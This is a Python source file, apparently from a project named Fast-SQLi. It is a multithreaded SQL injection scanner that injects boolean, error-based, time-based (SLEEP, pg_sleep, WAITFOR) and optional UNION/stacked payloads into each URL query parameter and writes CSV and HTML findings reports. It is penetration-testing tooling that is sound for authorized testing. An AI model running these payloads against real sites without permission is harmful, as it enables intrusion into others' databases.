#!/usr/bin/env python3
"""
sqli_tester_report.py
Advanced multi-parameter SQLi pre-scanner with threaded URL scanning + CSV/HTML reporting.

- Scans URLs (from single input or urls.txt) using a ThreadPoolExecutor (default 10 threads).
- Tests all GET parameters for multiple techniques (basic diffs, boolean, error, time).
- Prints logs live, stores plain-text logs internally and writes them to sqli_run.log.
- Produces sqli_findings.csv and sqli_report.html with summary, findings table and full logs.

USAGE: python sqli_tester_report.py
IMPORTANT: Run only against systems you own or have permission to test.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import socket
import os
from concurrent.futures import ThreadPoolExecutor
import threading
from difflib import SequenceMatcher
import re
import time
import sys
import json
import csv
import html

# === CONFIG ===
WHITE = "\033[1;37m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                  'AppleWebKit/537.36 (KHTML, like Gecko) '
                  'Chrome/140.0.0.0 Safari/537.36 SQLiTest/2.1'
}
TIMEOUT = 12  # seconds for requests
THREADS = 10

# set to True to run more aggressive tests (UNION, stacked attempts)
AGGRESSIVE = False

# thresholds
DIFF_THRESHOLD = 0.98         # similarity ratio above this => considered same
TIME_SLEEP_THRESHOLD = 4.0    # seconds extra considered as time-based injection
BOOLEAN_SIM_THRESHOLD = 0.99  # if true/false responses are very similar -> likely no boolean effect

print_lock = threading.Lock()
detected_lock = threading.Lock()
log_lock = threading.Lock()

all_detected = []  # list of (url, param, method, evidence)
log_entries = []   # plain text log lines

# regex patterns for common DB error messages (error-based detection)
DB_ERROR_PATTERNS = [
    re.compile(r"SQL syntax.*MySQL", re.IGNORECASE),
    re.compile(r"Warning.*mysql_", re.IGNORECASE),
    re.compile(r"valid MySQL result", re.IGNORECASE),
    re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
    re.compile(r"PG::SyntaxError", re.IGNORECASE),
    re.compile(r"Microsoft SQL Server", re.IGNORECASE),
    re.compile(r"SQLServerException", re.IGNORECASE),
    re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE),
    re.compile(r"ORA-00933|ORA-01756|ORA-", re.IGNORECASE),
]

# helper funcs
def strip_ansi(s: str) -> str:
    return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', s)

def safe_log(msg: str):
    """Append plain text message to log_entries (thread-safe)."""
    with log_lock:
        log_entries.append(msg)

def safe_print(msg: str):
    """Print colored msg to console and store stripped msg in log."""
    with print_lock:
        print(msg)
    plain = strip_ansi(msg)
    safe_log(plain)

def similarity(a: str, b: str) -> float:
    return SequenceMatcher(None, a, b).ratio()

def send_request(url: str, allow_redirects=True, verify_ssl=True):
    """
    Send GET request and return dict with response data.
    """
    try:
        start = time.time()
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT,
                            allow_redirects=allow_redirects, verify=verify_ssl)
        elapsed = time.time() - start
        content = resp.text or ""
        return {
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "content": content,
            "content_len": int(resp.headers.get('Content-Length', len(resp.content) if resp.content is not None else 0)),
            "elapsed": elapsed,
            "url": resp.url
        }
    except requests.RequestException as e:
        return {"error": str(e)}

def build_url_from_parts(parsed, params):
    """
    Build full URL string from parsed result and params dict.
    """
    query = urlencode(params, doseq=True)
    new = (parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment)
    return urlunparse(new)

# payload sets (non-destructive)
BASIC_PAYLOADS = {
    "single_quote": ("'", "append single quote"),
    "double_quote": ('"', "append double quote"),
    "slash": ("/", "append slash")
}

BOOLEAN_PAYLOADS = [
    ("AND_TRUE/FALSE_str", "' AND 'a'='a' -- ", "' AND 'a'='b' -- "),
    ("AND_TRUE/FALSE_num", " AND 1234=1234 -- ", " AND 1234=1235 -- "),
    ("OR_TRUE/FALSE", "' OR '1'='1' -- ", "' OR '1'='2' -- "),
]

TIME_PAYLOADS = [
    ("MySQL_SLEEP", "' OR SLEEP(5) -- ", 5),
    ("Postgres_PG_SLEEP", "'; SELECT pg_sleep(5); -- ", 5),
    ("MSSQL_WAITFOR", "'; WAITFOR DELAY '0:0:5' -- ", 5),
]

ERROR_PAYLOADS = [
    "'\"",  # mismatched quotes
    "' OR extractvalue(1,concat(0x3a,(version()))) -- ",
    "' OR updatexml(null,concat(0x3a,(version())),null) -- ",
]

UNION_MARKER = "sqli_test_marker_12345"
UNION_PAYLOADS = [
    ("UNION_SIMPLE", "' UNION SELECT '" + UNION_MARKER + "' -- "),
    ("UNION_NUM", "' UNION SELECT 12345 -- "),
]

STACKED_PAYLOADS = [
    ("STACKED_SELECT", "'; SELECT 1 -- "),
]

def make_payload_variants(original_value, payload):
    return original_value + payload

def check_error_patterns(text):
    for pat in DB_ERROR_PATTERNS:
        if pat.search(text):
            return pat.pattern
    return None

def detect_via_diff(base_text, new_text, threshold=DIFF_THRESHOLD):
    sim = similarity(base_text, new_text)
    return sim < threshold, sim

def test_parameter(parsed_url, original_params, param_name, original_url, verify_ssl=True):
    detected = []

    safe_print(f"{WHITE}[info] Testing parameter '{param_name}' on {original_url}{RESET}")

    base_url = build_url_from_parts(parsed_url, original_params)
    base_resp = send_request(base_url, verify_ssl=verify_ssl)
    if "error" in base_resp:
        safe_print(f"{RED}[error] Base request failed for {original_url}: {base_resp['error']}{RESET}")
        return detected

    base_text = base_resp.get("content", "")
    base_status = base_resp.get("status")
    base_headers = base_resp.get("headers", {})
    base_elapsed = base_resp.get("elapsed", 0.0)

    # 1) BASIC payloads
    for name, (pl, desc) in BASIC_PAYLOADS.items():
        safe_print(f"{YELLOW}[info] Basic payload {name} on '{param_name}'...{RESET}")
        new_params = {k: list(v) for k, v in original_params.items()}
        new_params[param_name] = [make_payload_variants(original_params[param_name][0], pl)]
        new_url = build_url_from_parts(parsed_url, new_params)
        r = send_request(new_url, verify_ssl=verify_ssl)
        if "error" in r:
            safe_print(f"{RED}[error] Request failed for basic payload {name}: {r['error']}{RESET}")
            continue

        if r.get("status") != base_status:
            evidence = f"status change: {base_status} -> {r.get('status')}"
            safe_print(f"{GREEN}[detected] {original_url} --> basic-{name} on '{param_name}' ({evidence}){RESET}")
            detected.append((param_name, f"basic-{name}-status", evidence))
        elif r.get("headers", {}).get("Location") and base_headers.get("Location") != r.get("headers", {}).get("Location"):
            evidence = f"redirect Location changed"
            safe_print(f"{GREEN}[detected] {original_url} --> basic-{name} on '{param_name}' ({evidence}){RESET}")
            detected.append((param_name, f"basic-{name}-redirect", evidence))
        else:
            diff_flag, sim = detect_via_diff(base_text, r.get("content", ""))
            if diff_flag:
                evidence = f"content similarity {sim:.4f}"
                safe_print(f"{GREEN}[detected] {original_url} --> basic-{name} on '{param_name}' ({evidence}){RESET}")
                detected.append((param_name, f"basic-{name}-diff", evidence))

    # 2) BOOLEAN-based
    for bp_name, true_payload, false_payload in BOOLEAN_PAYLOADS:
        safe_print(f"{YELLOW}[info] Boolean test {bp_name} on '{param_name}'...{RESET}")
        p_true = {k: list(v) for k, v in original_params.items()}
        p_false = {k: list(v) for k, v in original_params.items()}
        p_true[param_name] = [make_payload_variants(original_params[param_name][0], true_payload)]
        p_false[param_name] = [make_payload_variants(original_params[param_name][0], false_payload)]
        url_true = build_url_from_parts(parsed_url, p_true)
        url_false = build_url_from_parts(parsed_url, p_false)
        r_true = send_request(url_true, verify_ssl=verify_ssl)
        r_false = send_request(url_false, verify_ssl=verify_ssl)
        if "error" in r_true or "error" in r_false:
            safe_print(f"{RED}[error] Boolean request failed: {r_true.get('error')} / {r_false.get('error')}{RESET}")
            continue
        sim_tf = similarity(r_true.get("content", ""), r_false.get("content", ""))
        if sim_tf < BOOLEAN_SIM_THRESHOLD:
            evidence = f"boolean diff sim={sim_tf:.4f}"
            safe_print(f"{GREEN}[detected] {original_url} --> boolean {bp_name} on '{param_name}' ({evidence}){RESET}")
            detected.append((param_name, f"boolean-{bp_name}", evidence))

    # 3) ERROR-based
    for err_pl in ERROR_PAYLOADS:
        safe_print(f"{YELLOW}[info] Error-inducing payload on '{param_name}'...{RESET}")
        params_e = {k: list(v) for k, v in original_params.items()}
        params_e[param_name] = [make_payload_variants(original_params[param_name][0], err_pl)]
        url_e = build_url_from_parts(parsed_url, params_e)
        r_e = send_request(url_e, verify_ssl=verify_ssl)
        if "error" in r_e:
            safe_print(f"{RED}[error] Error payload request failed: {r_e['error']}{RESET}")
            continue
        found = check_error_patterns(r_e.get("content", ""))
        if found:
            evidence = f"matched error regex: {found}"
            safe_print(f"{GREEN}[detected] {original_url} --> error-based on '{param_name}' ({evidence}){RESET}")
            detected.append((param_name, "error-based", evidence))

    # 4) TIME-based
    for tname, tpayload, tdelay in TIME_PAYLOADS:
        safe_print(f"{YELLOW}[info] Time-based test {tname} on '{param_name}' (expect ~{tdelay}s)...{RESET}")
        params_t = {k: list(v) for k, v in original_params.items()}
        params_t[param_name] = [make_payload_variants(original_params[param_name][0], tpayload)]
        url_t = build_url_from_parts(parsed_url, params_t)
        t_start = time.time()
        r_t = send_request(url_t, verify_ssl=verify_ssl)
        t_elapsed = time.time() - t_start
        if "error" in r_t:
            safe_print(f"{RED}[error] Time payload request failed: {r_t['error']}{RESET}")
            continue
        delta = t_elapsed - base_elapsed
        if delta >= TIME_SLEEP_THRESHOLD:
            evidence = f"time delta {delta:.2f}s (payload {tname})"
            safe_print(f"{GREEN}[detected] {original_url} --> time-based {tname} on '{param_name}' ({evidence}){RESET}")
            detected.append((param_name, f"time-{tname}", evidence))

    # 5) UNION-based (AGGRESSIVE)
    if AGGRESSIVE:
        for uname, upayload in UNION_PAYLOADS:
            safe_print(f"{YELLOW}[info] UNION attempt {uname} on '{param_name}'...{RESET}")
            params_u = {k: list(v) for k, v in original_params.items()}
            params_u[param_name] = [make_payload_variants(original_params[param_name][0], upayload)]
            url_u = build_url_from_parts(parsed_url, params_u)
            r_u = send_request(url_u, verify_ssl=verify_ssl)
            if "error" in r_u:
                safe_print(f"{RED}[error] UNION request failed: {r_u['error']}{RESET}")
                continue
            if UNION_MARKER in r_u.get("content", ""):
                evidence = f"marker '{UNION_MARKER}' found"
                safe_print(f"{GREEN}[detected] {original_url} --> union {uname} on '{param_name}' ({evidence}){RESET}")
                detected.append((param_name, f"union-{uname}", evidence))
            else:
                diff_flag, sim = detect_via_diff(base_text, r_u.get("content", ""))
                if diff_flag:
                    evidence = f"union diff sim={sim:.4f}"
                    safe_print(f"{GREEN}[detected] {original_url} --> union-diff {uname} on '{param_name}' ({evidence}){RESET}")
                    detected.append((param_name, f"union-{uname}-diff", evidence))

    # 6) STACKED (AGGRESSIVE)
    if AGGRESSIVE:
        for sname, spayload in STACKED_PAYLOADS:
            safe_print(f"{YELLOW}[info] Stacked attempt {sname} on '{param_name}'...{RESET}")
            params_s = {k: list(v) for k, v in original_params.items()}
            params_s[param_name] = [make_payload_variants(original_params[param_name][0], spayload)]
            url_s = build_url_from_parts(parsed_url, params_s)
            r_s = send_request(url_s, verify_ssl=verify_ssl)
            if "error" in r_s:
                safe_print(f"{RED}[error] Stacked request failed: {r_s['error']}{RESET}")
                continue
            diff_flag, sim = detect_via_diff(base_text, r_s.get("content", ""))
            if diff_flag:
                evidence = f"stacked diff sim={sim:.4f}"
                safe_print(f"{GREEN}[detected] {original_url} --> stacked {sname} on '{param_name}' ({evidence}){RESET}")
                detected.append((param_name, f"stacked-{sname}", evidence))

    return detected

def test_sqli_url(original_url, verify_ssl=True):
    parsed = urlparse(original_url)
    original_params = parse_qs(parsed.query)

    safe_print(f"{WHITE}[info] Testing URL: {original_url}{RESET}")

    if not original_params:
        safe_print(f"{RED}[error] URL has no query parameters: {original_url}{RESET}")
        return

    try:
        ip = socket.gethostbyname(parsed.netloc)
    except socket.gaierror:
        ip = "Unknown IP"
    safe_print(f"{WHITE}[info] target -> {original_url} [{ip}]{RESET}")

    url_detected = []

    # iterate over all parameters (serially per URL)
    for param in list(original_params.keys()):
        try:
            det = test_parameter(parsed, original_params, param, original_url, verify_ssl=verify_ssl)
            if det:
                for (pname, method, evidence) in det:
                    with detected_lock:
                        all_detected.append((original_url, pname, method, evidence))
                        url_detected.append((pname, method, evidence))
        except Exception as exc:
            safe_print(f"{RED}[error] Exception while testing param {param} on {original_url}: {exc}{RESET}")

    if not url_detected:
        safe_print(f"{YELLOW}[info] No detections for URL: {original_url}{RESET}")
    else:
        for (pname, method, evidence) in url_detected:
            safe_print(f"{GREEN}[detected] Immediate: {original_url} --> {method} on '{pname}' ({evidence}){RESET}")

def generate_csv(filename="sqli_findings.csv"):
    if not all_detected:
        return
    try:
        with open(filename, "w", newline="", encoding="utf-8") as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["url", "parameter", "method", "evidence"])
            for (url, param, method, evidence) in all_detected:
                writer.writerow([url, param, method, evidence])
        safe_print(f"{WHITE}[info] CSV saved: {filename}{RESET}")
    except Exception as e:
        safe_print(f"{RED}[error] Failed to save CSV: {e}{RESET}")

def generate_html_report(filename="sqli_report.html", run_time_seconds=0, total_urls=0):
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    findings_count = len(all_detected)
    # aggregate counts by method
    method_counts = {}
    for (_, _, method, _) in all_detected:
        method_counts[method] = method_counts.get(method, 0) + 1

    # build HTML
    rows_html = ""
    for (url, param, method, evidence) in all_detected:
        rows_html += "<tr>"
        rows_html += f"<td>{html.escape(url)}</td>"
        rows_html += f"<td>{html.escape(param)}</td>"
        rows_html += f"<td>{html.escape(method)}</td>"
        rows_html += f"<td>{html.escape(evidence)}</td>"
        rows_html += "</tr>\n"

    log_text = "\n".join(html.escape(line) for line in log_entries)

    html_content = f"""<!doctype html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>Fast-SQLi Test Report</title>
    <style>
    body{{font-family:Arial,Helvetica,sans-serif;padding:20px;background:#f7f7f7;margin:0;}}
    .container{{max-width:1100px;margin:20px auto;background:#fff;padding:25px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.08)}}
    h1,h2{{margin-top:0}}
    table{{width:100%;border-collapse:collapse;margin-top:20px;margin-bottom:20px}}
    th,td{{padding:10px;border:1px solid #ddd;text-align:left;font-size:14px;word-break:break-all;}}
    th{{background:#222;color:#fff}}
    .summary{{margin:20px 0;padding:15px;background:#fafafa;border:1px solid #eee;border-radius:6px}}
    .logbox{{white-space:pre-wrap;background:#111;color:#eee;padding:15px;border-radius:6px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:13px;}}
    .badge{{display:inline-block;padding:4px 10px;border-radius:6px;background:#eee;margin:0 5px 5px 0;font-size:12px;}}
    .github-link-top{{position:fixed;top:15px;right:20px;text-decoration:none;font-weight:bold;color:#444;background:#fff;padding:6px 12px;border-radius:5px;box-shadow:0 2px 8px rgba(0,0,0,0.1);border:1px solid #ddd;}}
    .github-link-top:hover{{background:#f5f5f5;}}
    .footer{{text-align:center;margin-top:25px;padding-top:20px;border-top:1px solid #eee;font-size:12px;color:#777;}}
    .footer p{{margin:5px 0;}}
    .footer a{{color:#007bff;text-decoration:none;}}
    </style>
    </head>
    <body>
    <a href="https://github.com/Am1rX/Fast-SQLi" target="_blank" class="github-link-top">Fast-SQLi on GitHub</a>
    <div class="container">
    <h1>Fast-SQLi Test Report</h1>
    <p>Generated: {now}</p>
    <div class="summary">
    <p><strong>Total URLs scanned:</strong> {total_urls}</p>
    <p><strong>Total findings:</strong> {findings_count}</p>
    <p><strong>Scan time (s):</strong> {run_time_seconds:.2f}</p>
    <p>
    <strong>Method counts:</strong><br>
    {" ".join(f'<span class="badge">{html.escape(k)}: {v}</span>' for k,v in method_counts.items()) if method_counts else "N/A"}
    </p>
    </div>

    <h2>Findings</h2>
    {('<table><thead><tr><th>URL</th><th>Parameter</th><th>Method</th><th>Evidence</th></tr></thead><tbody>' + rows_html + '</tbody></table>') if rows_html else "<p>No vulnerabilities were found.</p>"}

    <div class="footer">
        <p><strong>Disclaimer:</strong> This tool is intended for educational purposes and authorized security testing only. Using this tool on systems without explicit permission from the owner is illegal. The developers assume no liability and are not responsible for any misuse or damage caused by this program.</p>
        <p><strong>Fast-SQLi</strong> | Source: <a href="https://github.com/Am1rX/Fast-SQLi" target="_blank">github.com/Am1rX/Fast-SQLi</a></p>
    </div>

    </div>
    </body>
    </html>
    """
    try:
        with open(filename, "w", encoding="utf-8") as fh:
            fh.write(html_content)
        safe_print(f"{WHITE}[info] HTML report saved: {filename}{RESET}")
    except Exception as e:
        safe_print(f"{RED}[error] Failed to save HTML report: {e}{RESET}")

def save_plain_log(filename="sqli_run.log"):
    try:
        with open(filename, "w", encoding="utf-8") as fh:
            for line in log_entries:
                fh.write(line + "\n")
        safe_print(f"{WHITE}[info] Plain log saved: {filename}{RESET}")
    except Exception as e:
        safe_print(f"{RED}[error] Failed to save plain log: {e}{RESET}")

def main():
    safe_print("Choose option:")
    safe_print("1. Single URL")
    safe_print("2. Multi URL from urls.txt")
    choice = input("Enter choice (1 or 2): ").strip()

    if choice == "1":
        urls = [input("Enter the URL (e.g., http://example.com/page.php?id=1): ").strip()]
    elif choice == "2":
        if not os.path.isfile("urls.txt"):
            safe_print(f"{RED}[error] urls.txt not found in current directory.{RESET}")
            sys.exit(1)
        with open("urls.txt", "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip()]
    else:
        safe_print(f"{RED}[error] Invalid choice.{RESET}")
        sys.exit(1)

    # optional: SSL verify toggle
    verify_ssl = True
    ans = input("Verify SSL certificates? (Y/n) [default Y]: ").strip().lower()
    if ans == "n":
        verify_ssl = False
        safe_print(f"{YELLOW}[info] SSL verification disabled. Be careful!{RESET}")

    # optional: aggressive mode toggle
    global AGGRESSIVE
    ans2 = input("Enable aggressive tests (UNION/STACKED)? (y/N) [default N]: ").strip().lower()
    if ans2 == "y":
        AGGRESSIVE = True
        safe_print(f"{YELLOW}[info] Aggressive tests ENABLED. They may trigger WAF or logs.{RESET}")
    else:
        AGGRESSIVE = False

    safe_print(f"{WHITE}[info] Starting scan with {THREADS} threads on {len(urls)} URLs...{RESET}")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        # map URLs to threads (each URL's params tested serially inside)
        executor.map(lambda u: test_sqli_url(u, verify_ssl=verify_ssl), urls)

    duration = time.time() - start_time

    safe_print("\n" + "=" * 60)
    if all_detected:
        safe_print(f"{GREEN}All Detected SQLi Findings:{RESET}")
        for (url, param, method, evidence) in all_detected:
            safe_print(f"{GREEN}{url} --> {method} on '{param}' ({evidence}){RESET}")
    else:
        safe_print(f"{YELLOW}No SQLi findings.{RESET}")

    # save outputs
    generate_csv("sqli_findings.csv")
    generate_html_report("sqli_report.html", run_time_seconds=duration, total_urls=len(urls))
    save_plain_log("sqli_run.log")

if __name__ == "__main__":
    main()
